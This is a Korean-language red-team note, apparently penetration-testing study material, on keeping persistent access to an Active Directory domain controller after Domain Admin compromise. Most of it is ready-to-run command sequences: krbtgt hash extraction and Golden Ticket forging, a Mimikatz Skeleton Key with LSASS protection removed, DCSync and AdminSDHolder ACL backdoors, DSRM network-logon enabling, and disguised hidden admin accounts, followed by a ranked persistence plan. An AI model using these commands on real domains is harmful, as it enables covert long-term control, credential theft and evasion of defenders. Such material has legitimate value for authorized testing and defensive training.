# 03_지속성

# AD DC장악 — 지속성 유지

---

## 개념

DA 권한을 확보한 이후 패스워드 변경, 계정 삭제, 보안 패치 등으로 접근이 끊겨도 복귀할 수 있도록 여러 레이어의 백도어를 심어두는 단계다. 하나의 방법에만 의존하지 않고 여러 기법을 조합해 다층 지속성을 확보하는 것이 원칙이다.

---

## Golden Ticket — krbtgt 해시 보관

krbtgt 해시를 오프라인에 보관하면 도메인이 살아있는 한 언제든 Golden Ticket을 재생성해 접근할 수 있다. 방어 측에서 krbtgt 패스워드를 변경해도 2회 연속 변경이 아니면 이전 해시로 생성한 티켓이 여전히 유효하다. 가장 강력하고 장기적인 지속성 수단이다.

```bash
# krbtgt 해시 추출 및 보관
impacket-secretsdump \
  -just-dc-user krbtgt \
  corp.local/Administrator:'Password1!'@<DC_IP>

# 출력 내용 안전한 곳에 저장:
# krbtgt:502:aad3b435...<LM>:<NTLM>:::
# krbtgt:aes256-cts-hmac-sha1-96:<AES256>

# 이후 언제든 Golden Ticket 재생성
impacket-ticketer \
  -nthash <KRBTGT_NTLM> \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain corp.local \
  Administrator

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass administrator@dc.corp.local
```

## Skeleton Key (메모리 백도어)

DC의 LSASS 메모리를 패치해 모든 도메인 계정에 추가 패스워드 ’mimikatz’로 접근할 수 있게 만드는 방식이다. 실제 패스워드는 그대로 유지되고 ’mimikatz’라는 마스터 패스워드가 추가되는 방식이다.

DC 재시작 시 패치가 초기화되어 사라지므로 영구적이지 않다. 또한 LSASS가 Protected Process(PPL)로 실행 중인 환경에서는 드라이버(mimidriv.sys)가 필요하다.

```bash
:: DC에서 직접 실행 (관리자 권한 필요)
privilege::debug
misc::skeleton

:: LSASS가 Protected Process일 때
privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton
!-

:: 설치 후 확인 — 모든 계정에 'mimikatz'로 접근 가능
net use \\dc.corp.local\c$ /user:corp\Administrator mimikatz
net use \\dc.corp.local\c$ /user:corp\john mimikatz

:: Linux에서도 가능
impacket-psexec corp.local/Administrator:mimikatz@<DC_IP>
evil-winrm -i <DC_IP> -u Administrator -p mimikatz
```

## DCSync 권한 부여 (영구적 ACL 백도어)

일반 계정에 DCSync 권한(복제 권한)을 부여하면 DA 없이도 언제든 도메인 내 모든 해시를 추출할 수 있다. ACL로 설정되므로 재부팅 후에도 유지되며, 눈에 잘 띄지 않는다.

```powershell
Import-Module .\PowerView.ps1

# 백도어 계정에 DCSync 권한 부여
Add-DomainObjectAcl `
  -TargetIdentity "DC=corp,DC=local" `
  -PrincipalIdentity backdoor_user `
  -Rights DCSync `
  -Verbose

# 권한 확인
Get-DomainObjectAcl "DC=corp,DC=local" -ResolveGUIDs | `
  Where-Object {$_.IdentityReferenceName -eq "backdoor_user"}

# 이후 백도어 계정으로 언제든 해시 추출
impacket-secretsdump corp.local/backdoor_user:'Password1!'@<DC_IP>
```

```bash
# impacket으로도 DCSync 권한 부여 가능
impacket-dacledit   -action write   -rights DCSync   -principal backdoor_user   -target-dn "DC=corp,DC=local"   'corp.local/Administrator:Password1!'   -dc-ip <DC_IP>
```

## AdminSDHolder 수정 (영구적 DA 동급 권한)

AdminSDHolder는 `CN=AdminSDHolder,CN=System,DC=corp,DC=local`에 위치한 특수 컨테이너다. SDProp(Security Descriptor Propagator) 프로세스가 기본 60분마다 실행되어 AdminSDHolder의 ACL을 모든 Protected 그룹(Domain Admins, Schema Admins 등)과 그 멤버들에게 강제 적용한다.

AdminSDHolder에 ACL을 추가하면 SDProp 실행 시마다 해당 권한이 모든 DA에 자동 적용되어, 사실상 우리 계정이 DA 그룹 전체에 대한 제어권을 갖게 된다.

```powershell
Import-Module .\PowerView.ps1

# AdminSDHolder에 GenericAll 추가
Add-DomainObjectAcl `
  -TargetIdentity "AdminSDHolder" `
  -PrincipalIdentity backdoor_user `
  -Rights All `
  -Verbose

# 또는 특정 권한만
Add-DomainObjectAcl `
  -TargetIdentity "AdminSDHolder" `
  -PrincipalIdentity backdoor_user `
  -Rights ResetPassword `
  -Verbose

# 권한 확인
Get-DomainObjectAcl "AdminSDHolder" -ResolveGUIDs | `
  Where-Object {$_.IdentityReferenceName -eq "backdoor_user"}

# SDProp 강제 실행 (60분 기다리지 않고 즉시 적용)
$RootDSE = [ADSI]"LDAP://RootDSE"
$RootDSE.Put("runProtectAdminGroupsTask", 1)
$RootDSE.SetInfo()

# 적용 후 DA 계정 패스워드 변경으로 접근 가능
Set-DomainUserPassword -Identity Administrator -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
```

## DSRM 백도어 (DC 로컬 관리자)

DSRM(Directory Services Restore Mode) 계정은 DC의 로컬 Administrator 계정이다. DC가 도메인에서 분리되거나 AD 서비스가 중단된 상황에서도 접근할 수 있어 최후의 수단으로 유용하다.

기본적으로 DSRM 계정은 네트워크 로그인이 불가하다. `DsrmAdminLogonBehavior` 레지스트리 값을 2로 설정하면 네트워크 로그인이 허용된다.

```bash
:: DC에서 DSRM 패스워드 해시 추출
privilege::debug
token::elevate
lsadump::sam
:: Administrator 항목이 DSRM 계정의 해시

:: 네트워크 로그인 허용 설정
reg add HKLM\System\CurrentControlSet\Control\Lsa ^
  /v DsrmAdminLogonBehavior /t REG_DWORD /d 2

:: PowerShell로
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" `
  -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

:: 설정 확인
reg query HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior
```

```bash
# NTLM 해시로 DC에 접근 (NTLM 강제 - IP 사용)
impacket-secretsdump -hashes :<DSRM_NTLM> corp.local/Administrator@<DC_IP>
impacket-psexec -hashes :<DSRM_NTLM> administrator@<DC_IP>
nxc smb <DC_IP> -u administrator -H <DSRM_NTLM> --local-auth
```

## 백도어 계정 생성

가장 단순한 방법이지만 가장 먼저 발견될 수 있다. 계정 이름을 시스템 계정처럼 위장하거나 기존 계정처럼 위장하는 방식을 쓴다.

```bash
:: Windows (cmd)
net user svc_backup Password123! /add /domain
net group "Domain Admins" svc_backup /add /domain

:: 계정 설명 위장
net user svc_backup /comment:"Backup Service Account" /domain
```

```powershell
:: PowerShell
New-ADUser `
  -Name "svc_backup" `
  -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) `
  -Enabled $true `
  -Description "Backup Service Account" `
  -PasswordNeverExpires $true

Add-ADGroupMember -Identity "Domain Admins" -Members "svc_backup"

# 계정 숨기기 (RDP 로그인 화면에서 안 보이게)
Set-ADUser svc_backup -Replace @{userAccountControl=66048}
```

```bash
# Linux — impacket으로 컴퓨터 계정 생성
impacket-addcomputer corp.local/Administrator:'Password1!' \
  -computer-name 'BACKUP$' \
  -computer-pass 'Password123!' \
  -dc-ip <DC_IP>
```

## 요약 — 지속성 우선순위

```
1순위: krbtgt 해시 오프라인 보관 (가장 강력, 탐지 어려움)
2순위: DCSync 권한 부여 (영구적 ACL, 재부팅 후에도 유지)
3순위: AdminSDHolder 수정 (SDProp 주기마다 자동 적용)
4순위: DSRM 백도어 (도메인 분리 상황에도 접근 가능)
5순위: 백도어 계정 생성 (단순하지만 발견 위험 높음)
6순위: Skeleton Key (재시작 시 사라짐, 임시 수단)
```

## 흐름

DA 권한 확보 → krbtgt 해시 추출 후 오프라인 보관 → DCSync 권한 부여 (영구 ACL) → AdminSDHolder 수정 (자동 전파) → DSRM 네트워크 로그인 활성화 → 다층 지속성 확보 → 접근 경로별 테스트 확인
